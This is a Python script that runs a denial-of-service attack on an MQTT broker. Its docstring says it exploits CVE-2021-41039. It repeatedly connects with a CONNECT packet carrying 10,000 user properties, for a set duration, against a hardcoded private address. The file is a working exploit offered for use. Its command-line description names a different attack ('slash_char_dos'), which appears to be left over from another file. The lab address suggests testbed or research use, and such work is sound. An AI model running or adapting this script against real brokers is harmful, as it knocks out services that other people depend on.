import argparse
import random

import paho.mqtt.client as mqtt
import mqtt_utilities as util
import time


def generate_properties():
    properties = mqtt.Properties(mqtt.PacketTypes.CONNECT)
    key = "k"
    value = "v"
    user_property = []
    for i in range(10000):
        user_property.append((key + str(i), value + str(i)))
    properties.UserProperty = user_property
    return properties

def main(username, password, duration=10):
    """The user properties dos attack connects with a large amount of user properties to cause excessive CPU usage and loss of performance by exploiting CVE-2021-41039"""

    broker = "10.0.0.1"
    port = 1883
    connection = util.Connection_status()
    generated_properties = generate_properties()
    start_time = time.time()

    while True:
        client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2,
                             userdata={"connection":connection}, protocol=mqtt.MQTTv5)
        client.username_pw_set(username, password)
        client.on_connect = util.on_connect
        client.on_disconnect = util.on_disconnect
        client.connect(broker, port, properties=generated_properties)
        print("sent malformed CONNECT packet, disconnecting...", flush=True)
        time.sleep(0.1 * random.randint(1, 2))
        client.disconnect()
        elapsed_time = time.time() - start_time
        print("Execution time: " + str(elapsed_time))
        if elapsed_time >= duration:
            print("Time elapsed, execution is terminating...", flush=True)
            return

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="launch a slash_char_dos attack from the local machine")
    parser.add_argument("-d", "--duration", type=int, help="duration in seconds")
    parser.add_argument("-u", "--username", type=str, help="username to connect as")
    parser.add_argument("-p", "--password", type=str, help="password to connect with")
    args = parser.parse_args()
    main(args.username, args.password, args.duration)